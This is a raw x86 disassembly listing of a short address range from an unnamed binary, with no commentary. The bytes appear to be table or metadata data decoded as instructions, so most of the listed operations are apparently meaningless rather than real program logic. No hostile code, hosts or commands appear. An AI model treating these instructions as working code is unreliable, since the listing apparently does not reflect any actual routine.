  404d51:	00 96 00 e1 17 c9    	add    %dl,-0x36e81f00(%esi)
  404d57:	02 26                	add    (%esi),%ah
  404d59:	00 c0                	add    %al,%al
  404d5b:	39 00                	cmp    %eax,(%eax)
  404d5d:	00 00                	add    %al,(%eax)
  404d5f:	00 91 18 df 11 bc    	add    %dl,-0x43ee20e8(%ecx)
  404d65:	01 26                	add    %esp,(%esi)
  404d67:	00 d8                	add    %bl,%al
  404d69:	39 00                	cmp    %eax,(%eax)
  404d6b:	00 00                	add    %al,(%eax)
  404d6d:	00 96 00 50 02 a5    	add    %dl,-0x5afdb000(%esi)
  404d73:	01 26                	add    %esp,(%esi)
  404d75:	00 40 3c             	add    %al,0x3c(%eax)
  404d78:	00 00                	add    %al,(%eax)
  404d7a:	00 00                	add    %al,(%eax)
  404d7c:	91                   	xchg   %eax,%ecx
  404d7d:	00 95 04 6c 06 27    	add    %dl,0x27066c04(%ebp)
  404d83:	00 68 3d             	add    %ch,0x3d(%eax)
  404d86:	00 00                	add    %al,(%eax)
  404d88:	00 00                	add    %al,(%eax)
  404d8a:	91                   	xchg   %eax,%ecx
  404d8b:	00 a1 02 bc 01 28    	add    %ah,0x2801bc02(%ecx)
  404d91:	00 ac 3d 00 00 00 00 	add    %ch,0x0(%ebp,%edi,1)
  404d98:	96                   	xchg   %eax,%esi
  404d99:	00 a0 11 e3 00 28    	add    %ah,0x2800e311(%eax)
  404d9f:	00 f4                	add    %dh,%ah
  404da1:	3d 00 00 00 00       	cmp    $0x0,%eax
  404da6:	91                   	xchg   %eax,%ecx
  404da7:	18 df                	sbb    %bl,%bh
  404da9:	11 bc 01 29 00 00 3e 	adc    %edi,0x3e000029(%ecx,%eax,1)
  404db0:	00 00                	add    %al,(%eax)
  404db2:	00 00                	add    %al,(%eax)
  404db4:	86 18                	xchg   %bl,(%eax)
  404db6:	d9 11                	fsts   (%ecx)
  404db8:	10 00                	adc    %al,(%eax)
  404dba:	29 00                	sub    %eax,(%eax)
  404dbc:	78 3e                	js     0x404dfc
  404dbe:	00 00                	add    %al,(%eax)
  404dc0:	00 00                	add    %al,(%eax)
  404dc2:	86 00                	xchg   %al,(%eax)
  404dc4:	01 17                	add    %edx,(%edi)
  404dc6:	ce                   	into
  404dc7:	00 2a                	add    %ch,(%edx)
  404dc9:	00 a0 3e 00 00 00    	add    %ah,0x3e(%eax)
  404dcf:	00 86 00 01 17 a3    	add    %al,-0x5ce8ff00(%esi)
  404dd5:	02 2b                	add    (%ebx),%ch
  404dd7:	00 08                	add    %cl,(%eax)
  404dd9:	40                   	inc    %eax
  404dda:	00 00                	add    %al,(%eax)
  404ddc:	00 00                	add    %al,(%eax)
  404dde:	86 00                	xchg   %al,(%eax)
  404de0:	f9                   	stc
  404de1:	16                   	push   %ss
  404de2:	ce                   	into
  404de3:	00 2c 00             	add    %ch,(%eax,%eax,1)
  404de6:	30 40 00             	xor    %al,0x0(%eax)
  404de9:	00 00                	add    %al,(%eax)
  404deb:	00 86 00 f9 16 a3    	add    %al,-0x5ce90700(%esi)
  404df1:	02 2d 00 f8 41 00    	add    0x41f800,%ch
  404df7:	00 48 00             	add    %cl,0x0(%eax)
  404dfa:	81 00 c9 0c 73 06    	addl   $0x6730cc9,(%eax)
  404e00:	2e 00 34 42          	add    %dh,%cs:(%edx,%eax,2)
  404e04:	00 00                	add    %al,(%eax)
  404e06:	00 00                	add    %al,(%eax)
  404e08:	91                   	xchg   %eax,%ecx
  404e09:	18 df                	sbb    %bl,%bh
  404e0b:	11 bc 01 30 00 50 42 	adc    %edi,0x42500030(%ecx,%eax,1)
  404e12:	00 00                	add    %al,(%eax)
  404e14:	00 00                	add    %al,(%eax)
  404e16:	96                   	xchg   %eax,%esi
  404e17:	00 2d 0b 5d 00 30    	add    %ch,0x30005d0b
  404e1d:	00 dc                	add    %bl,%ah
  404e1f:	42                   	inc    %edx
  404e20:	00 00                	add    %al,(%eax)
  404e22:	00 00                	add    %al,(%eax)
  404e24:	96                   	xchg   %eax,%esi
  404e25:	00 2d 0b f7 03 31    	add    %ch,0x3103f70b
  404e2b:	00 00                	add    %al,(%eax)
  404e2d:	00 01                	add    %al,(%ecx)
  404e2f:	00 29                	add    %ch,(%ecx)
  404e31:	09 00                	or     %eax,(%eax)
  404e33:	00 01                	add    %al,(%ecx)
  404e35:	00 29                	add    %ch,(%ecx)
  404e37:	09 00                	or     %eax,(%eax)
  404e39:	00 01                	add    %al,(%ecx)
  404e3b:	00 29                	add    %ch,(%ecx)
  404e3d:	09 00                	or     %eax,(%eax)
  404e3f:	00 01                	add    %al,(%ecx)
  404e41:	00 29                	add    %ch,(%ecx)
  404e43:	09 00                	or     %eax,(%eax)
  404e45:	00 01                	add    %al,(%ecx)
  404e47:	00 29                	add    %ch,(%ecx)
  404e49:	09 00                	or     %eax,(%eax)
  404e4b:	00 01                	add    %al,(%ecx)
  404e4d:	00 29                	add    %ch,(%ecx)
  404e4f:	09 00                	or     %eax,(%eax)
  404e51:	00 01                	add    %al,(%ecx)
  404e53:	00 29                	add    %ch,(%ecx)
  404e55:	09 00                	or     %eax,(%eax)
  404e57:	00 01                	add    %al,(%ecx)
  404e59:	00 29                	add    %ch,(%ecx)
  404e5b:	09 00                	or     %eax,(%eax)
  404e5d:	00 01                	add    %al,(%ecx)
  404e5f:	00 29                	add    %ch,(%ecx)
  404e61:	09 00                	or     %eax,(%eax)
  404e63:	00 01                	add    %al,(%ecx)
  404e65:	00 29                	add    %ch,(%ecx)
  404e67:	09 00                	or     %eax,(%eax)
  404e69:	00 01                	add    %al,(%ecx)
  404e6b:	00 32                	add    %dh,(%edx)
  404e6d:	06                   	push   %es
  404e6e:	00 00                	add    %al,(%eax)
  404e70:	01 00                	add    %eax,(%eax)
  404e72:	8d 10                	lea    (%eax),%edx
  404e74:	00 00                	add    %al,(%eax)
  404e76:	02 00                	add    (%eax),%al
  404e78:	0d 07 00 00 03       	or     $0x3000007,%eax
  404e7d:	00 21                	add    %ah,(%ecx)
  404e7f:	0e                   	push   %cs
  404e80:	00 00                	add    %al,(%eax)
  404e82:	04 00                	add    $0x0,%al
  404e84:	71 14                	jno    0x404e9a
  404e86:	00 00                	add    %al,(%eax)
  404e88:	01 00                	add    %eax,(%eax)
  404e8a:	0d 10 00 00 01       	or     $0x1000010,%eax
  404e8f:	00 23                	add    %ah,(%ebx)
  404e91:	0b 00                	or     (%eax),%eax
  404e93:	00 01                	add    %al,(%ecx)
  404e95:	00 b7 0b 00 00 01    	add    %dh,0x100000b(%edi)
  404e9b:	00 b7 0b 00 00 01    	add    %dh,0x100000b(%edi)
  404ea1:	00 39                	add    %bh,(%ecx)
  404ea3:	0b 00                	or     (%eax),%eax
  404ea5:	00 01                	add    %al,(%ecx)
  404ea7:	00 0f                	add    %cl,(%edi)
  404ea9:	15 00 00 01 00       	adc    $0x10000,%eax
  404eae:	da 03                	fiaddl (%ebx)
  404eb0:	00 00                	add    %al,(%eax)
  404eb2:	02 00                	add    (%eax),%al
  404eb4:	63 17                	arpl   %edx,(%edi)
  404eb6:	00 00                	add    %al,(%eax)
  404eb8:	03 00                	add    (%eax),%eax
  404eba:	e7 16                	out    %eax,$0x16
  404ebc:	00 00                	add    %al,(%eax)
  404ebe:	01 00                	add    %eax,(%eax)
  404ec0:	cc                   	int3
  404ec1:	05 00 00 01 00       	add    $0x10000,%eax
  404ec6:	81 14 00 00 02 00 a5 	adcl   $0xa5000200,(%eax,%eax,1)
  404ecd:	16                   	push   %ss
  404ece:	00 00                	add    %al,(%eax)
  404ed0:	01 00                	add    %eax,(%eax)
  404ed2:	84 13                	test   %dl,(%ebx)
  404ed4:	00 00                	add    %al,(%eax)
  404ed6:	01 00                	add    %eax,(%eax)
  404ed8:	35 00 00 00 02       	xor    $0x2000000,%eax
  404edd:	00 88 00 00 00 03    	add    %cl,0x3000000(%eax)
  404ee3:	00 8b 00 00 00 01    	add    %cl,0x1000000(%ebx)
  404ee9:	00 8d 10 00 00 02    	add    %cl,0x2000010(%ebp)
  404eef:	00 cb                	add    %cl,%bl
  404ef1:	09 00                	or     %eax,(%eax)
  404ef3:	00 01                	add    %al,(%ecx)
  404ef5:	00 32                	add    %dh,(%edx)
  404ef7:	06                   	push   %es
  404ef8:	00 00                	add    %al,(%eax)
  404efa:	02 00                	add    (%eax),%al
  404efc:	29 09                	sub    %ecx,(%ecx)
  404efe:	00 00                	add    %al,(%eax)
  404f00:	01 00                	add    %eax,(%eax)
  404f02:	29 09                	sub    %ecx,(%ecx)
  404f04:	00 00                	add    %al,(%eax)
  404f06:	01 00                	add    %eax,(%eax)
  404f08:	32 06                	xor    (%esi),%al
  404f0a:	00 00                	add    %al,(%eax)
  404f0c:	01 00                	add    %eax,(%eax)
  404f0e:	e8 01 00 00 01       	call   0x1404f14
  404f13:	00 1e                	add    %bl,(%esi)
  404f15:	0c 00                	or     $0x0,%al
  404f17:	00 01                	add    %al,(%ecx)
  404f19:	00 a3 17 00 00 01    	add    %ah,0x1000017(%ebx)
  404f1f:	00 10                	add    %dl,(%eax)
  404f21:	18 00                	sbb    %al,(%eax)
  404f23:	00 01                	add    %al,(%ecx)
  404f25:	00 3a                	add    %bh,(%edx)
  404f27:	17                   	pop    %ss
  404f28:	00 00                	add    %al,(%eax)
  404f2a:	01 00                	add    %eax,(%eax)
  404f2c:	3a 17                	cmp    (%edi),%dl
  404f2e:	00 00                	add    %al,(%eax)
  404f30:	01 00                	add    %eax,(%eax)
  404f32:	3a 17                	cmp    (%edi),%dl
  404f34:	00 00                	add    %al,(%eax)
  404f36:	01 00                	add    %eax,(%eax)
  404f38:	3a 17                	cmp    (%edi),%dl
  404f3a:	00 00                	add    %al,(%eax)
  404f3c:	01 00                	add    %eax,(%eax)
  404f3e:	32 00                	xor    (%eax),%al
  404f40:	00 00                	add    %al,(%eax)
  404f42:	02 00                	add    (%eax),%al
  404f44:	74 00                	je     0x404f46
  404f46:	00 00                	add    %al,(%eax)
  404f48:	01 00                	add    %eax,(%eax)
  404f4a:	3a 17                	cmp    (%edi),%dl
  404f4c:	00 00                	add    %al,(%eax)
  404f4e:	01 00                	add    %eax,(%eax)
  404f50:	3a 17                	cmp    (%edi),%dl
  404f52:	09 00                	or     %eax,(%eax)
  404f54:	d9 11                	fsts   (%ecx)
  404f56:	01 00                	add    %eax,(%eax)
  404f58:	11 00                	adc    %eax,(%eax)
  404f5a:	d9 11                	fsts   (%ecx)
  404f5c:	06                   	push   %es
  404f5d:	00 19                	add    %bl,(%ecx)
  404f5f:	00 d9                	add    %bl,%cl
  404f61:	11 0a                	adc    %ecx,(%edx)
  404f63:	00 29                	add    %ch,(%ecx)
  404f65:	00 d9                	add    %bl,%cl
  404f67:	11 10                	adc    %edx,(%eax)
  404f69:	00 31                	add    %dh,(%ecx)
  404f6b:	00 d9                	add    %bl,%cl
  404f6d:	11 10                	adc    %edx,(%eax)
  404f6f:	00 39                	add    %bh,(%ecx)
  404f71:	00 d9                	add    %bl,%cl
  404f73:	11 10                	adc    %edx,(%eax)
  404f75:	00 41 00             	add    %al,0x0(%ecx)
  404f78:	d9 11                	fsts   (%ecx)
  404f7a:	10 00                	adc    %al,(%eax)
  404f7c:	49                   	dec    %ecx
  404f7d:	00 d9                	add    %bl,%cl
  404f7f:	11 10                	adc    %edx,(%eax)
  404f81:	00 51 00             	add    %dl,0x0(%ecx)
  404f84:	d9 11                	fsts   (%ecx)
  404f86:	10 00                	adc    %al,(%eax)
  404f88:	59                   	pop    %ecx
  404f89:	00 d9                	add    %bl,%cl
  404f8b:	11 10                	adc    %edx,(%eax)
  404f8d:	00 61 00             	add    %ah,0x0(%ecx)
  404f90:	d9 11                	fsts   (%ecx)
  404f92:	15 00 69 00 d9       	adc    $0xd9006900,%eax
  404f97:	11 10                	adc    %edx,(%eax)
  404f99:	00 71 00             	add    %dh,0x0(%ecx)
  404f9c:	d9 11                	fsts   (%ecx)
  404f9e:	10 00                	adc    %al,(%eax)
  404fa0:	99                   	cltd
  404fa1:	00 d9                	add    %bl,%cl
  404fa3:	11 06                	adc    %eax,(%esi)
  404fa5:	00 a9 00 d9 11 1a    	add    %ch,0x1a11d900(%ecx)
  404fab:	00 01                	add    %al,(%ecx)
  404fad:	01 c5                	add    %eax,%ebp
  404faf:	0f 2c 00             	cvttps2pi (%eax),%mm0
  404fb2:	11 02                	adc    %eax,(%edx)
  404fb4:	65 00 31             	add    %dh,%gs:(%ecx)
  404fb7:	00 19                	add    %bl,(%ecx)
  404fb9:	02 c5                	add    %ch,%al
  404fbb:	15 2c 00 11 02       	adc    $0x211002c,%eax
  404fc0:	00 0e                	add    %cl,(%esi)
  404fc2:	36 00 79 00          	add    %bh,%ss:0x0(%ecx)
  404fc6:	d9 11                	fsts   (%ecx)
  404fc8:	06                   	push   %es
  404fc9:	00 81 00 f9 17 45    	add    %al,0x4517f900(%ecx)
  404fcf:	00 21                	add    %ah,(%ecx)
  404fd1:	02 c4                	add    %ah,%al
  404fd3:	17                   	pop    %ss
  404fd4:	4b                   	dec    %ebx
  404fd5:	00 31                	add    %dh,(%ecx)
  404fd7:	02 b4 00 51 00 31 02 	add    0x2310051(%eax,%eax,1),%dh
  404fde:	51                   	push   %ecx
  404fdf:	13 57 00             	adc    0x0(%edi),%edx
  404fe2:	39 02                	cmp    %eax,(%edx)
  404fe4:	50                   	push   %eax
  404fe5:	01 5d 00             	add    %ebx,0x0(%ebp)
  404fe8:	11 02                	adc    %eax,(%edx)
  404fea:	70 0a                	jo     0x404ff6
  404fec:	62 00                	bound  %eax,(%eax)
  404fee:	89 00                	mov    %eax,(%eax)
  404ff0:	4b                   	dec    %ebx
  404ff1:	0b 68 00             	or     0x0(%eax),%ebp
  404ff4:	b1 00                	mov    $0x0,%cl
  404ff6:	d9 11                	fsts   (%ecx)
  404ff8:	8a 00                	mov    (%eax),%al
  404ffa:	b1 00                	mov    $0x0,%cl
  404ffc:	ab                   	stos   %eax,%es:(%edi)
  404ffd:	09 01                	or     %eax,(%ecx)
  404fff:	00 b1 00 98 09 01    	add    %dh,0x1099800(%ecx)
  405005:	00 59 02             	add    %bl,0x2(%ecx)
  405008:	89 18                	mov    %ebx,(%eax)
  40500a:	97                   	xchg   %eax,%edi
  40500b:	00 59 02             	add    %bl,0x2(%ecx)
  40500e:	b7 15                	mov    $0x15,%bh
  405010:	9d                   	popf
  405011:	00 69 02             	add    %ch,0x2(%ecx)
  405014:	d9 11                	fsts   (%ecx)
  405016:	06                   	push   %es
  405017:	00 69 02             	add    %ch,0x2(%ecx)
  40501a:	44                   	inc    %esp
  40501b:	17                   	pop    %ss
  40501c:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  40501d:	00 71 02             	add    %dh,0x2(%ecx)
  405020:	ca 12 a9             	lret   $0xa912
  405023:	00 b1 00 43 15 b0    	add    %dh,-0x4feabd00(%ecx)
  405029:	00 b1 00 73 02 b7    	add    %dh,-0x48fd8d00(%ecx)
  40502f:	00 b1 00 43 15 bb    	add    %dh,-0x44eabd00(%ecx)
  405035:	00 d1                	add    %dl,%cl
  405037:	00 d9                	add    %bl,%cl
  405039:	11 06                	adc    %eax,(%esi)
  40503b:	00 d9                	add    %bl,%cl
  40503d:	00 d9                	add    %bl,%cl
  40503f:	11 c1                	adc    %eax,%ecx
  405041:	00 d1                	add    %dl,%cl
  405043:	00 ef                	add    %ch,%bh
  405045:	13 c7                	adc    %edi,%eax
  405047:	00 d1                	add    %dl,%cl
  405049:	00 90 0a ce 00 59    	add    %dl,0x5900ce0a(%eax)
  40504f:	02 b7 15 d3 00 69    	add    0x6900d315(%edi),%dh
  405055:	02 44 17 dd          	add    -0x23(%edi,%edx,1),%al
  405059:	00 89 02 d0 06 06    	add    %cl,0x606d002(%ecx)
  40505f:	00 91 02 62 06 e3    	add    %dl,-0x1cf99dfe(%ecx)
  405065:	00 99 02 d9 11 e8    	add    %bl,-0x17ee26fe(%ecx)
  40506b:	00 a1 02 d9 11 ef    	add    %ah,-0x10ee26fe(%ecx)
  405071:	00 b9 00 d9 11 f5    	add    %bh,-0xaee2700(%ecx)
  405077:	00 b1 00 b7 16 00    	add    %dh,0x16b700(%ecx)
  40507d:	01 79 00             	add    %edi,0x0(%ecx)
  405080:	9f                   	lahf
  405081:	0a 06                	or     (%esi),%al
  405083:	01 b9 00 40 16 0a    	add    %edi,0xa164000(%ecx)
  405089:	01 d1                	add    %edx,%ecx
  40508b:	02 d9                	add    %cl,%bl
  40508d:	11 ef                	adc    %ebp,%edi
  40508f:	00 c1                	add    %al,%cl
  405091:	00 d9                	add    %bl,%cl
  405093:	11 16                	adc    %edx,(%esi)
  405095:	01 d9                	add    %ebx,%ecx
  405097:	02 d9                	add    %cl,%bl
  405099:	11 ef                	adc    %ebp,%edi
  40509b:	00 a9 02 4b 02 20    	add    %ch,0x20024b02(%ecx)
  4050a1:	01 e1                	add    %esp,%ecx
  4050a3:	02 24 06             	add    (%esi,%eax,1),%ah
  4050a6:	2d 01 a9 02 d0       	sub    $0xd002a901,%eax
  4050ab:	06                   	push   %es
  4050ac:	06                   	push   %es
  4050ad:	00 b1 00 d0 06 06    	add    %dh,0x606d000(%ecx)
  4050b3:	00 c1                	add    %al,%cl
  4050b5:	00 d0                	add    %dl,%al
  4050b7:	06                   	push   %es
  4050b8:	06                   	push   %es
  4050b9:	00 a9 02 43 02 45    	add    %ch,0x45024302(%ecx)
  4050bf:	01 f1                	add    %esi,%ecx
  4050c1:	02 65 00             	add    0x0(%ebp),%ah
  4050c4:	4b                   	dec    %ebx
  4050c5:	01 f9                	add    %edi,%ecx
  4050c7:	02 9f 0a 06 01 59    	add    0x5901060a(%edi),%bl
  4050cd:	02 fc                	add    %ah,%bh
  4050cf:	14 52                	adc    $0x52,%al
  4050d1:	01 a9 02 50 02 59    	add    %ebp,0x59025002(%ecx)
  4050d7:	01 01                	add    %eax,(%ecx)
  4050d9:	03 d9                	add    %ecx,%ebx
  4050db:	11 ef                	adc    %ebp,%edi
  4050dd:	00 01                	add    %al,(%ecx)
  4050df:	01 d9                	add    %ebx,%ecx
  4050e1:	11 61 01             	adc    %esp,0x1(%ecx)
  4050e4:	01 01                	add    %eax,(%ecx)
  4050e6:	1c 17                	sbb    $0x17,%al
  4050e8:	68 01 09 03 85       	push   $0x85030901
  4050ed:	11 7d 01             	adc    %edi,0x1(%ebp)
  4050f0:	f1                   	int1
  4050f1:	02 51 13             	add    0x13(%ecx),%dl
  4050f4:	84 01                	test   %al,(%ecx)
  4050f6:	b1 00                	mov    $0x0,%cl
  4050f8:	22 0d 8a 01 a9 02    	and    0x2a9018a,%cl
  4050fe:	5f                   	pop    %edi
  4050ff:	07                   	pop    %es
  405100:	92                   	xchg   %eax,%edx
  405101:	01 09                	add    %ecx,(%ecx)
  405103:	01 d9                	add    %ebx,%ecx
  405105:	11 9a 01 a9 02 07    	adc    %ebx,0x702a901(%edx)
  40510b:	0f a0                	push   %fs
  40510d:	01 a9 02 56 0b 06    	add    %ebp,0x60b5602(%ecx)
  405113:	00 09                	add    %cl,(%ecx)
  405115:	03 c5                	add    %ebp,%eax
  405117:	15 a5 01 11 01       	adc    $0x11101a5,%eax
  40511c:	d9 11                	fsts   (%ecx)
  40511e:	06                   	push   %es
  40511f:	00 11                	add    %dl,(%ecx)
  405121:	01 2b                	add    %ebp,(%ebx)
  405123:	15 b0 01 11 01       	adc    $0x11101b0,%eax
  405128:	b5 0a                	mov    $0xa,%ch
  40512a:	10 00                	adc    %al,(%eax)
  40512c:	11 01                	adc    %eax,(%ecx)
  40512e:	09 13                	or     %edx,(%ebx)
  405130:	b7 01                	mov    $0x1,%bh
  405132:	19 03                	sbb    %eax,(%ebx)
  405134:	3b 15 bc 01 19 02    	cmp    0x21901bc,%edx
  40513a:	a2 12 5d 00 21       	mov    %al,0x21005d12
  40513f:	03 6c 06 e4          	add    -0x1c(%esi,%eax,1),%ebp
  405143:	01 19                	add    %ebx,(%ecx)
  405145:	01 d9                	add    %ebx,%ecx
  405147:	11 10                	adc    %edx,(%eax)
  405149:	00 29                	add    %ch,(%ecx)
  40514b:	01 8a 14 ea 01 29    	add    %ecx,0x2901ea14(%edx)
  405151:	01 4d 05             	add    %ecx,0x5(%ebp)
  405154:	f0 01 29             	lock add %ebp,(%ecx)
  405157:	03 96 05 06 01 31    	add    0x31010605(%esi),%edx
  40515d:	03 f8                	add    %eax,%edi
  40515f:	05 06 01 59 02       	add    $0x2590106,%eax
  405164:	95                   	xchg   %eax,%ebp
  405165:	18 97 00 29 01 bd    	sbb    %dl,-0x42fed700(%edi)
  40516b:	12 f6                	adc    %dh,%dh
  40516d:	01 29                	add    %ebp,(%ecx)
  40516f:	01 1d 0d 06 00 31    	add    %ebx,0x3100060d
  405175:	01 d9                	add    %ebx,%ecx
  405177:	11 06                	adc    %eax,(%esi)
  405179:	00 31                	add    %dh,(%ecx)
  40517b:	01 a3 05 10 00 31    	add    %esp,0x31001005(%ebx)
  405181:	03 8d 05 06 01 21    	add    0x21010605(%ebp),%ecx
  405187:	03 59 0e             	add    0xe(%ecx),%ebx
  40518a:	5d                   	pop    %ebp
  40518b:	00 59 02             	add    %bl,0x2(%ecx)
  40518e:	fc                   	cld
  40518f:	14 fd                	adc    $0xfd,%al
  405191:	01 31                	add    %esi,(%ecx)
  405193:	01 c4                	add    %eax,%esp
  405195:	14 10                	adc    $0x10,%al
  405197:	00 31                	add    %dh,(%ecx)
  405199:	01 6a 05             	add    %ebp,0x5(%edx)
  40519c:	03 02                	add    (%edx),%eax
  40519e:	31 01                	xor    %eax,(%ecx)
  4051a0:	7c 17                	jl     0x4051b9
  4051a2:	15 00 29 01 1c       	adc    $0x1c012900,%eax
  4051a7:	17                   	pop    %ss
  4051a8:	0a 02                	or     (%edx),%al
  4051aa:	41                   	inc    %ecx
  4051ab:	03 61 11             	add    0x11(%ecx),%esp
  4051ae:	13 02                	adc    (%edx),%eax
  4051b0:	49                   	dec    %ecx
  4051b1:	03 d8                	add    %eax,%ebx
  4051b3:	06                   	push   %es
  4051b4:	5d                   	pop    %ebp
  4051b5:	00 39                	add    %bh,(%ecx)
  4051b7:	01 ee                	add    %ebp,%esi
  4051b9:	17                   	pop    %ss
  4051ba:	18 02                	sbb    %al,(%edx)
  4051bc:	39 01                	cmp    %eax,(%ecx)
  4051be:	20 09                	and    %cl,(%ecx)
  4051c0:	22 02                	and    (%edx),%al
  4051c2:	59                   	pop    %ecx
  4051c3:	03 e5                	add    %ebp,%esp
  4051c5:	14 36                	adc    $0x36,%al
  4051c7:	00 59 03             	add    %bl,0x3(%ecx)
  4051ca:	4f                   	dec    %edi
  4051cb:	07                   	pop    %es
  4051cc:	e3 00                	jecxz  0x4051ce
  4051ce:	21 01                	and    %eax,(%ecx)
  4051d0:	d9 11                	fsts   (%ecx)
  4051d2:	28 02                	sub    %al,(%edx)
  4051d4:	59                   	pop    %ecx
  4051d5:	03 29                	add    (%ecx),%ebp
  4051d7:	13 62 00             	adc    0x0(%edx),%esp
  4051da:	21 03                	and    %eax,(%ebx)
  4051dc:	b0 05                	mov    $0x5,%al
  4051de:	30 02                	xor    %al,(%edx)
  4051e0:	59                   	pop    %ecx
  4051e1:	02 fc                	add    %ah,%bh
  4051e3:	14 e4                	adc    $0xe4,%al
  4051e5:	01 41 01             	add    %eax,0x1(%ecx)
  4051e8:	d9 11                	fsts   (%ecx)
  4051ea:	10 00                	adc    %al,(%eax)
  4051ec:	69 03 62 06 10 00    	imul   $0x100662,(%ebx),%eax
  4051f2:	21 03                	and    %eax,(%ebx)
  4051f4:	6f                   	outsl  %ds:(%esi),(%dx)
  4051f5:	0b 30                	or     (%eax),%esi
  4051f7:	02 21                	add    (%ecx),%ah
  4051f9:	03 c0                	add    %eax,%eax
  4051fb:	05 5d 00 31 01       	add    $0x131005d,%eax
  405200:	13 0b                	adc    (%ebx),%ecx
  405202:	15 00 31 01 f2       	adc    $0xf2013100,%eax
  405207:	08 15 00 91 00 79    	or     %dl,0x79009100
  40520d:	04 06                	add    $0x6,%al
  40520f:	01 19                	add    %ebx,(%ecx)
  405211:	02 2a                	add    (%edx),%ch
  405213:	17                   	pop    %ss
  405214:	e3 00                	jecxz  0x405216
  405216:	19 02                	sbb    %eax,(%edx)
  405218:	69 18 30 02 21 03    	imul   $0x3210230,(%eax),%ebx
  40521e:	ed                   	in     (%dx),%eax
  40521f:	16                   	push   %ss
  405220:	5d                   	pop    %ebp
  405221:	00 71 03             	add    %dh,0x3(%ecx)
  405224:	d9 11                	fsts   (%ecx)
  405226:	10 00                	adc    %al,(%eax)
  405228:	71 03                	jno    0x40522d
  40522a:	6c                   	insb   (%dx),%es:(%edi)
  40522b:	09 3a                	or     %edi,(%edx)
  40522d:	02 79 03             	add    0x3(%ecx),%bh
  405230:	d9 11                	fsts   (%ecx)
  405232:	06                   	push   %es
  405233:	00 79 03             	add    %bh,0x3(%ecx)
  405236:	e9 05 06 01 59       	jmp    0x59415840
  40523b:	02 98 11 06 01 59    	add    0x59010611(%eax),%bl
  405241:	02 25 14 43 02 49    	add    0x49024314,%ah
  405247:	01 d9                	add    %ebx,%ecx
  405249:	11 10                	adc    %edx,(%eax)
  40524b:	00 49 01             	add    %cl,0x1(%ecx)
  40524e:	55                   	push   %ebp
  40524f:	15 5a 02 51 01       	adc    $0x151025a,%eax
  405254:	c1 11 60             	rcll   $0x60,(%ecx)
  405257:	02 59 01             	add    0x1(%ecx),%bl
  40525a:	73 16                	jae    0x405272
  40525c:	66 02 61 01          	data16 add 0x1(%ecx),%ah
  405260:	79 0d                	jns    0x40526f
  405262:	6c                   	insb   (%dx),%es:(%edi)
  405263:	02 59 02             	add    0x2(%ecx),%bl
  405266:	dc 15 06 01 59 01    	fcoml  0x1590106
  40526c:	40                   	inc    %eax
  40526d:	17                   	pop    %ss
  40526e:	b7 00                	mov    $0x0,%bh
  405270:	29 01                	sub    %eax,(%ecx)
  405272:	b3 04                	mov    $0x4,%bl
  405274:	71 02                	jno    0x405278
  405276:	81 03 65 00 7b 02    	addl   $0x27b0065,(%ebx)
  40527c:	19 02                	sbb    %eax,(%edx)
  40527e:	d4 16                	aam    $0x16
  405280:	83 02 19             	addl   $0x19,(%edx)
  405283:	02 17                	add    (%edi),%dl
  405285:	06                   	push   %es
  405286:	30 02                	xor    %al,(%edx)
  405288:	19 02                	sbb    %eax,(%edx)
  40528a:	d9 05 30 02 19 02    	flds   0x2190230
  405290:	75 0e                	jne    0x4052a0
  405292:	87 02                	xchg   %eax,(%edx)
  405294:	59                   	pop    %ecx
  405295:	02 fc                	add    %ah,%bh
  405297:	14 8d                	adc    $0x8d,%al
  405299:	02 69 01             	add    0x1(%ecx),%ch
  40529c:	d9 11                	fsts   (%ecx)
  40529e:	06                   	push   %es
  40529f:	00 31                	add    %dh,(%ecx)
  4052a1:	02 7f 01             	add    0x1(%edi),%bh
  4052a4:	51                   	push   %ecx
  4052a5:	00 99 03 2d 0b a3    	add    %bl,-0x5cf4d2fd(%ecx)
  4052ab:	02 71 01             	add    0x1(%ecx),%dh
  4052ae:	d9 11                	fsts   (%ecx)
  4052b0:	06                   	push   %es
  4052b1:	00 c9                	add    %cl,%cl
  4052b3:	02 9f 0a ce 00 71    	add    0x7100ce0a(%edi),%bl
  4052b9:	01 e4                	add    %esp,%esp
  4052bb:	03 aa 02 59 02 d8    	add    -0x27fda6fe(%edx),%ebp
  4052c1:	0a b1 02 59 02 46    	or     0x46025902(%ecx),%dh
  4052c7:	11 06                	adc    %eax,(%esi)
  4052c9:	01 59 02             	add    %ebx,0x2(%ecx)
  4052cc:	fd                   	std
  4052cd:	03 c3                	add    %ebx,%eax
  4052cf:	02 19                	add    (%ecx),%bl
  4052d1:	02 82 0d c9 02 a1    	add    -0x5efd36f3(%edx),%al
  4052d7:	03 9f 0a 06 01 a9    	add    -0x56fef9f6(%edi),%ebx
  4052dd:	03 5c 0b 30          	add    0x30(%ebx,%ecx,1),%ebx
  4052e1:	02 31                	add    (%ecx),%dh
  4052e3:	03 40 06             	add    0x6(%eax),%eax
  4052e6:	cd 02                	int    $0x2
  4052e8:	79 01                	jns    0x4052eb
  4052ea:	52                   	push   %edx
  4052eb:	06                   	push   %es
  4052ec:	cd 02                	int    $0x2
  4052ee:	79 01                	jns    0x4052f1
  4052f0:	9f                   	lahf
  4052f1:	0a 06                	or     (%esi),%al
  4052f3:	01 b1 03 7f 16 d3    	add    %esi,-0x2ce980fd(%ecx)
  4052f9:	02 b9 03 d9 11 d9    	add    -0x26ee26fd(%ecx),%bh
  4052ff:	02 b9 03 1c 05 e0    	add    -0x1ffae3fd(%ecx),%bh
  405305:	02 a9 02 ca 06 06    	add    0x606ca02(%ecx),%ch
  40530b:	00 b1 00 ca 06 06    	add    %dh,0x606ca00(%ecx)
  405311:	00 49 01             	add    %cl,0x1(%ecx)
  405314:	d9 11                	fsts   (%ecx)
  405316:	c1 00 0c             	roll   $0xc,(%eax)
  405319:	00 d9                	add    %bl,%cl
  40531b:	11 06                	adc    %eax,(%esi)
  40531d:	00 0c 00             	add    %cl,(%eax,%eax,1)
  405320:	61                   	popa
  405321:	02 02                	add    (%edx),%al
  405323:	03 0c 00             	add    (%eax,%eax,1),%ecx
  405326:	ca 16 7b             	lret   $0x7b16
  405329:	02 0c 00             	add    (%eax,%eax,1),%cl
  40532c:	bc 17 08 03 59       	mov    $0x59030817,%esp
  405331:	02 54 0e 0e          	add    0xe(%esi,%ecx,1),%dl
  405335:	03 89 01 41 14 28    	add    0x28144101(%ecx),%ecx
  40533b:	03 89 01 62 01 2f    	add    0x2f016201(%ecx),%ecx
  405341:	03 91 01 aa 02 2f    	add    0x2f02aa01(%ecx),%edx
  405347:	03 c9                	add    %ecx,%ecx
